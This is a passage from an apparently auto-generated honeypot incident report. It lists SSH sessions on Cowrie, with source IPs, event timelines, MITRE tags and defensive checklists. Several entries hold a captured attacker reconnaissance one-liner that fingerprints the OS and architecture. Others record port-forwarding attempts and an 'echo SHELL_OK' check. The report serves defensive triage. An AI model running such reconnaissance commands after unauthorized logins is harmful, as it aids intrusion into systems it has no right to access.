| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 14:22 |
| **Last Seen** | 2026-07-28 14:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:22:24` | `cowrie.session.connect` |
| `2026-07-28 14:22:24` | `cowrie.client.version` |
| `2026-07-28 14:22:24` | `cowrie.client.kex` |
| `2026-07-28 14:22:25` | `cowrie.login.success` |
| `2026-07-28 14:22:25` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:22:25` | `cowrie.direct-tcpip.data` |
| `2026-07-28 14:22:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97d49b93e8f8

| Field | Detail |
|---|---|
| **Source IP** | `208.96.233[.]67` |
| **First Seen** | 2026-07-28 14:22 |
| **Last Seen** | 2026-07-28 14:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:22:49` | `cowrie.session.connect` |
| `2026-07-28 14:22:50` | `cowrie.client.version` |
| `2026-07-28 14:22:50` | `cowrie.client.kex` |
| `2026-07-28 14:22:51` | `cowrie.login.success` |
| `2026-07-28 14:22:51` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.96.233[.]67` to AbuseIPDB if not already reported
- [ ] Block `208.96.233[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36a1f282143e

| Field | Detail |
|---|---|
| **Source IP** | `183.223.156[.]154` |
| **First Seen** | 2026-07-28 14:22 |
| **Last Seen** | 2026-07-28 14:23 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:22:56` | `cowrie.session.connect` |
| `2026-07-28 14:22:58` | `cowrie.client.version` |
| `2026-07-28 14:22:58` | `cowrie.client.kex` |
| `2026-07-28 14:23:05` | `cowrie.login.success` |
| `2026-07-28 14:23:06` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.223.156[.]154` to AbuseIPDB if not already reported
- [ ] Block `183.223.156[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d519e6db34

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:23 |
| **Last Seen** | 2026-07-28 14:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:23:14` | `cowrie.session.connect` |
| `2026-07-28 14:23:15` | `cowrie.client.version` |
| `2026-07-28 14:23:15` | `cowrie.client.kex` |
| `2026-07-28 14:23:16` | `cowrie.login.success` |
| `2026-07-28 14:23:18` | `cowrie.session.params` |
| `2026-07-28 14:23:18` | `cowrie.command.input` |
| `2026-07-28 14:23:18` | `cowrie.command.input` |
| `2026-07-28 14:23:18` | `cowrie.command.input` |
| `2026-07-28 14:23:18` | `cowrie.command.input` |
| `2026-07-28 14:23:18` | `cowrie.command.input` |
| `2026-07-28 14:23:18` | `cowrie.command.success` |
| `2026-07-28 14:23:18` | `cowrie.command.input` |
| `2026-07-28 14:23:18` | `cowrie.command.input` |
| `2026-07-28 14:23:18` | `cowrie.command.input` |
| `2026-07-28 14:23:18` | `cowrie.command.input` |
| `2026-07-28 14:23:19` | `cowrie.log.closed` |
| `2026-07-28 14:23:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57cf704e3822

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:24 |
| **Last Seen** | 2026-07-28 14:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:24:25` | `cowrie.session.connect` |
| `2026-07-28 14:24:25` | `cowrie.client.version` |
| `2026-07-28 14:24:25` | `cowrie.client.kex` |
| `2026-07-28 14:24:27` | `cowrie.login.success` |
| `2026-07-28 14:24:28` | `cowrie.session.params` |
| `2026-07-28 14:24:28` | `cowrie.command.input` |
| `2026-07-28 14:24:28` | `cowrie.command.input` |
| `2026-07-28 14:24:28` | `cowrie.command.input` |
| `2026-07-28 14:24:28` | `cowrie.command.input` |
| `2026-07-28 14:24:28` | `cowrie.command.input` |
| `2026-07-28 14:24:28` | `cowrie.command.success` |
| `2026-07-28 14:24:28` | `cowrie.command.input` |
| `2026-07-28 14:24:28` | `cowrie.command.input` |
| `2026-07-28 14:24:28` | `cowrie.command.input` |
| `2026-07-28 14:24:28` | `cowrie.command.input` |
| `2026-07-28 14:24:29` | `cowrie.log.closed` |
| `2026-07-28 14:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2efd9b9de43c

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-28 14:24 |
| **Last Seen** | 2026-07-28 14:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:24:32` | `cowrie.session.connect` |
| `2026-07-28 14:24:32` | `cowrie.client.version` |
| `2026-07-28 14:24:32` | `cowrie.client.kex` |
| `2026-07-28 14:24:34` | `cowrie.login.success` |
| `2026-07-28 14:24:35` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed1f75147b6c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:25 |
| **Last Seen** | 2026-07-28 14:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:25:35` | `cowrie.session.connect` |
| `2026-07-28 14:25:35` | `cowrie.client.version` |
| `2026-07-28 14:25:35` | `cowrie.client.kex` |
| `2026-07-28 14:25:37` | `cowrie.login.success` |
| `2026-07-28 14:25:39` | `cowrie.session.params` |
| `2026-07-28 14:25:39` | `cowrie.command.input` |
| `2026-07-28 14:25:39` | `cowrie.command.input` |
| `2026-07-28 14:25:39` | `cowrie.command.input` |
| `2026-07-28 14:25:39` | `cowrie.command.input` |
| `2026-07-28 14:25:39` | `cowrie.command.input` |
| `2026-07-28 14:25:39` | `cowrie.command.success` |
| `2026-07-28 14:25:39` | `cowrie.command.input` |
| `2026-07-28 14:25:39` | `cowrie.command.input` |
| `2026-07-28 14:25:39` | `cowrie.command.input` |
| `2026-07-28 14:25:39` | `cowrie.command.input` |
| `2026-07-28 14:25:39` | `cowrie.log.closed` |
| `2026-07-28 14:25:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8712a934836a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-28 14:25 |
| **Last Seen** | 2026-07-28 14:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:25:39` | `cowrie.session.connect` |
| `2026-07-28 14:25:39` | `cowrie.client.version` |
| `2026-07-28 14:25:39` | `cowrie.client.kex` |
| `2026-07-28 14:25:39` | `cowrie.login.success` |
| `2026-07-28 14:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c28a7b464539

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-28 14:25 |
| **Last Seen** | 2026-07-28 14:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:25:39` | `cowrie.session.connect` |
| `2026-07-28 14:25:39` | `cowrie.client.version` |
| `2026-07-28 14:25:39` | `cowrie.client.kex` |
| `2026-07-28 14:25:39` | `cowrie.login.success` |
| `2026-07-28 14:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd280a389cb7

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-28 14:25 |
| **Last Seen** | 2026-07-28 14:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:25:43` | `cowrie.session.connect` |
| `2026-07-28 14:25:43` | `cowrie.client.version` |
| `2026-07-28 14:25:43` | `cowrie.client.kex` |
| `2026-07-28 14:25:43` | `cowrie.login.success` |
| `2026-07-28 14:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-025a4602d207

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-28 14:25 |
| **Last Seen** | 2026-07-28 14:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:25:43` | `cowrie.session.connect` |
| `2026-07-28 14:25:43` | `cowrie.client.version` |
| `2026-07-28 14:25:44` | `cowrie.client.kex` |
| `2026-07-28 14:25:44` | `cowrie.login.success` |
| `2026-07-28 14:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78caa25121cf

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:26 |
| **Last Seen** | 2026-07-28 14:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:26:46` | `cowrie.session.connect` |
| `2026-07-28 14:26:46` | `cowrie.client.version` |
| `2026-07-28 14:26:46` | `cowrie.client.kex` |
| `2026-07-28 14:26:48` | `cowrie.login.success` |
| `2026-07-28 14:26:49` | `cowrie.session.params` |
| `2026-07-28 14:26:49` | `cowrie.command.input` |
| `2026-07-28 14:26:49` | `cowrie.command.input` |
| `2026-07-28 14:26:49` | `cowrie.command.input` |
| `2026-07-28 14:26:49` | `cowrie.command.input` |
| `2026-07-28 14:26:49` | `cowrie.command.input` |
| `2026-07-28 14:26:49` | `cowrie.command.success` |
| `2026-07-28 14:26:49` | `cowrie.command.input` |
| `2026-07-28 14:26:49` | `cowrie.command.input` |
| `2026-07-28 14:26:49` | `cowrie.command.input` |
| `2026-07-28 14:26:49` | `cowrie.command.input` |
| `2026-07-28 14:26:50` | `cowrie.log.closed` |
| `2026-07-28 14:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b4db7d357d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:27 |
| **Last Seen** | 2026-07-28 14:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:27:56` | `cowrie.session.connect` |
| `2026-07-28 14:27:57` | `cowrie.client.version` |
| `2026-07-28 14:27:57` | `cowrie.client.kex` |
| `2026-07-28 14:27:58` | `cowrie.login.success` |
| `2026-07-28 14:28:00` | `cowrie.session.params` |
| `2026-07-28 14:28:00` | `cowrie.command.input` |
| `2026-07-28 14:28:00` | `cowrie.command.input` |
| `2026-07-28 14:28:00` | `cowrie.command.input` |
| `2026-07-28 14:28:00` | `cowrie.command.input` |
| `2026-07-28 14:28:00` | `cowrie.command.input` |
| `2026-07-28 14:28:00` | `cowrie.command.success` |
| `2026-07-28 14:28:00` | `cowrie.command.input` |
| `2026-07-28 14:28:00` | `cowrie.command.input` |
| `2026-07-28 14:28:00` | `cowrie.command.input` |
| `2026-07-28 14:28:00` | `cowrie.command.input` |
| `2026-07-28 14:28:00` | `cowrie.log.closed` |
| `2026-07-28 14:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d7ecedbb11c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:29 |
| **Last Seen** | 2026-07-28 14:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:29:09` | `cowrie.session.connect` |
| `2026-07-28 14:29:09` | `cowrie.client.version` |
| `2026-07-28 14:29:09` | `cowrie.client.kex` |
| `2026-07-28 14:29:11` | `cowrie.login.success` |
| `2026-07-28 14:29:12` | `cowrie.session.params` |
| `2026-07-28 14:29:12` | `cowrie.command.input` |
| `2026-07-28 14:29:12` | `cowrie.command.input` |
| `2026-07-28 14:29:12` | `cowrie.command.input` |
| `2026-07-28 14:29:12` | `cowrie.command.input` |
| `2026-07-28 14:29:12` | `cowrie.command.input` |
| `2026-07-28 14:29:12` | `cowrie.command.success` |
| `2026-07-28 14:29:12` | `cowrie.command.input` |
| `2026-07-28 14:29:13` | `cowrie.command.input` |
| `2026-07-28 14:29:13` | `cowrie.command.input` |
| `2026-07-28 14:29:13` | `cowrie.command.input` |
| `2026-07-28 14:29:13` | `cowrie.log.closed` |
| `2026-07-28 14:29:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79fffc3b5106

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:30 |
| **Last Seen** | 2026-07-28 14:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:30:19` | `cowrie.session.connect` |
| `2026-07-28 14:30:20` | `cowrie.client.version` |
| `2026-07-28 14:30:20` | `cowrie.client.kex` |
| `2026-07-28 14:30:22` | `cowrie.login.success` |
| `2026-07-28 14:30:23` | `cowrie.session.params` |
| `2026-07-28 14:30:23` | `cowrie.command.input` |
| `2026-07-28 14:30:23` | `cowrie.command.input` |
| `2026-07-28 14:30:23` | `cowrie.command.input` |
| `2026-07-28 14:30:23` | `cowrie.command.input` |
| `2026-07-28 14:30:23` | `cowrie.command.input` |
| `2026-07-28 14:30:23` | `cowrie.command.success` |
| `2026-07-28 14:30:23` | `cowrie.command.input` |
| `2026-07-28 14:30:23` | `cowrie.command.input` |
| `2026-07-28 14:30:23` | `cowrie.command.input` |
| `2026-07-28 14:30:23` | `cowrie.command.input` |
| `2026-07-28 14:30:24` | `cowrie.log.closed` |
| `2026-07-28 14:30:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-639c31544984

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]164` |
| **First Seen** | 2026-07-28 14:30 |
| **Last Seen** | 2026-07-28 14:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:30:32` | `cowrie.session.connect` |
| `2026-07-28 14:30:33` | `cowrie.client.version` |
| `2026-07-28 14:30:33` | `cowrie.client.kex` |
| `2026-07-28 14:30:34` | `cowrie.login.success` |
| `2026-07-28 14:30:35` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]164` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c9b4356c494

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:31 |
| **Last Seen** | 2026-07-28 14:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:31:31` | `cowrie.session.connect` |
| `2026-07-28 14:31:31` | `cowrie.client.version` |
| `2026-07-28 14:31:31` | `cowrie.client.kex` |
| `2026-07-28 14:31:33` | `cowrie.login.success` |
| `2026-07-28 14:31:35` | `cowrie.session.params` |
| `2026-07-28 14:31:35` | `cowrie.command.input` |
| `2026-07-28 14:31:35` | `cowrie.command.input` |
| `2026-07-28 14:31:35` | `cowrie.command.input` |
| `2026-07-28 14:31:35` | `cowrie.command.input` |
| `2026-07-28 14:31:35` | `cowrie.command.input` |
| `2026-07-28 14:31:35` | `cowrie.command.success` |
| `2026-07-28 14:31:35` | `cowrie.command.input` |
| `2026-07-28 14:31:35` | `cowrie.command.input` |
| `2026-07-28 14:31:35` | `cowrie.command.input` |
| `2026-07-28 14:31:35` | `cowrie.command.input` |
| `2026-07-28 14:31:36` | `cowrie.log.closed` |
| `2026-07-28 14:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c05fc092800

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]18` |
| **First Seen** | 2026-07-28 14:32 |
| **Last Seen** | 2026-07-28 14:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_OK` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:32:38` | `cowrie.session.connect` |
| `2026-07-28 14:32:39` | `cowrie.login.success` |
| `2026-07-28 14:32:40` | `cowrie.session.params` |
| `2026-07-28 14:32:40` | `cowrie.command.input` |
